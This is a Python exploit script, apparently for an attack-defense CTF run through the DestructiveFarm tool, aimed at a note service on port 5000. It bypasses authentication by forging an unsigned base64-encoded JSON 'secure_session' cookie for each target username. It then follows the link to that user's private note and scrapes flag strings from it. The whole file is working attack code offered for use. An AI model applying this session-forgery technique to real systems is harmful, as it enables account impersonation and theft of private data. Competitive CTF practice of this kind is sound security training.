import sys
import json
import base64
import re
import requests

PORT_API = '5000'
MAX_TIMEOUT = 8

def exploit_single_team(team_ip, user_ids):
    """
    Esegue l'exploit contro un singolo IP usando la lista di username passata dal farm.
    """
    if not user_ids:
        # Se il farm non ha ancora i flag_ids per questo round, non possiamo procedere
        return

    for username in user_ids:
        try:
            # Creare JSON {"user": "username"} e convertire in base64
            payload = {"user": username}
            json_str = json.dumps(payload)
            b64_session = base64.b64encode(json_str.encode()).decode()
            
            # Fare richiesta GET a /my-shporas con il cookie secure_session
            cookies = {'secure_session': b64_session}
            resp = requests.get(
                f"http://{team_ip}:{PORT_API}/my-shporas", 
                cookies=cookies, 
                timeout=MAX_TIMEOUT
            )
            
            if resp.status_code == 200:
                # Cercare il link specifico <a href="/shpora?id=...">
                href_match = re.search(r'<a\s+href="(/shpora\?id=[^"]+)"', resp.text, re.IGNORECASE)
                
                if href_match:
                    shpora_path = href_match.group(1)
                    shpora_url = f"http://{team_ip}:{PORT_API}{shpora_path}"
                    
                    # Seguire il link della nota vera
                    shpora_resp = requests.get(shpora_url, cookies=cookies, timeout=MAX_TIMEOUT)
                    
                    if shpora_resp.status_code == 200:
                        # Rimuovere i tag HTML e spazi/newline
                        content = re.sub(r'<[^>]+>', ' ', shpora_resp.text)
                        content = re.sub(r'\s+', ' ', content)
                        
                        # Cercare stringhe FLAG vere che terminano con =
                        matches = re.findall(r'[A-Z0-9]{31,}=', content)
                        
                        for flag in matches:
                            # CRITICO per il Farm: Stampiamo la flag pura sul terminale.
                            # Il Regex di DestructiveFarm intercetterà questa riga.
                            print(flag, flush=True)
                            
        except Exception:
            # Mandiamo gli errori su stderr per non sporcare lo stdout che legge il farm
            continue

if __name__ == "__main__":
    # DestructiveFarm chiama lo script passando l'IP come primo parametro
    if len(sys.argv) < 2:
        print("Uso: python sploit.py <TARGET_IP> [FLAG_ID_JSON]", file=sys.stderr)
        sys.exit(1)
        
    target_ip = sys.argv[1]
    
    # Gestione dinamica dei Flag IDs
    # I farm più moderni passano la lista/stringa dei flag_id associati a questo IP 
    # come secondo argomento (o tramite variabile d'ambiente).
    flag_ids = []
    if len(sys.argv) > 2:
        try:
            # Se viene passata una stringa JSON di username (es: '["user1", "user2"]')
            flag_ids = json.loads(sys.argv[2])
        except Exception:
            # Se viene passato un singolo username grezzo
            flag_ids = [sys.argv[2]]
            
    # Se il farm non passa i flag_ids come parametro ma hai configurato DestructiveFarm 
    # per scaricare i flag_ids in autonomia da un URL, puoi lasciare che il farm gestisca il parsing,
    # oppure (se preferisci un fallback manuale nello script) decommenta le righe sotto:
    """
    if not flag_ids:
        try:
            r = requests.get('http://10.27.27.10/api/client/attack_data', timeout=5)
            flag_ids = r.json().get("shporas", {}).get(target_ip, [])
        except Exception:
            pass
    """

    exploit_single_team(target_ip, flag_ids)